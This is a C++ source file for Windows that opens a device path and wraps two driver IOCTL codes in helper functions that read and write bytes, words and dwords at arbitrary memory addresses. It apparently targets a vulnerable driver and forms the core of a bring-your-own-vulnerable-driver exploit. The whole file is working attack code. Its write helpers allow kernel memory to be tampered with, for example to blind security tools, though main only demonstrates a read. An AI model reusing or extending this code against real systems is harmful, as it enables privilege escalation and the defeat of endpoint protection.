#include <windows.h>
#include <stdio.h>

#define IOCTL_READ_ROUTINE  0x80002048
#define IOCTL_WRITE_ROUTINE 0x8000204C

typedef struct _MEMORY_OPERATION {
    uint8_t  gap1[8];
    uint64_t address;
    uint8_t  gap2[4];
    uint32_t offset;
    uint32_t size;
    uint32_t data;
    uint8_t  gap3[16];
} MEMORY_OPERATION, *PMEMORY_OPERATION;

bool ReadUint8(HANDLE hDevice, uintptr_t address, uint8_t* buffer)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint8_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool ReadUint16(HANDLE hDevice, uintptr_t address, uint16_t* buffer)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint16_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool ReadUint32(HANDLE hDevice, uintptr_t address, uint32_t* buffer)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint32_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool ReadMemory(HANDLE hDevice, uintptr_t address, void* buffer, size_t size)
{
    for (size_t i = 0; i < size; ++i)
    {
        if (!ReadUint8(hDevice, address + i, static_cast<uint8_t*>(buffer) + i))
        {
            return false;
        }
    }
    return true;
}

bool WriteUint8(HANDLE hDevice, uintptr_t address, uint8_t value)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint8_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

bool WriteUint16(HANDLE hDevice, uintptr_t address, uint16_t value)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint16_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

bool WriteUint32(HANDLE hDevice, uintptr_t address, uint32_t value)
{
    MEMORY_OPERATION operation;
    memset(&operation, 0, sizeof(operation));
    operation.address = address;
    operation.size = sizeof(uint32_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

int wmain(int argc, wchar_t* argv[])
{
    if (argc != 2)
    {
        printf("[-] Usage: %ls <device path>\n", argv[0]);
        return 1;
    }

    HANDLE hDevice = CreateFileW(
        argv[1],
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open device handle. Error: %lu\n", GetLastError());
        return 1;
    }

    uint8_t value;
    if (!ReadUint8(hDevice, 0x10000000, &value))
    {
        printf("[-] Failed to read value. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Value: %d\n", value);

    uint16_t value16;
    if (!ReadUint16(hDevice, 0x10000000, &value16))
    {
        printf("[-] Failed to read value. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Value: %d\n", value16);

    printf("[+] Successfully obtained handle to device interface.\n");
    CloseHandle(hDevice);
    return 0;
}
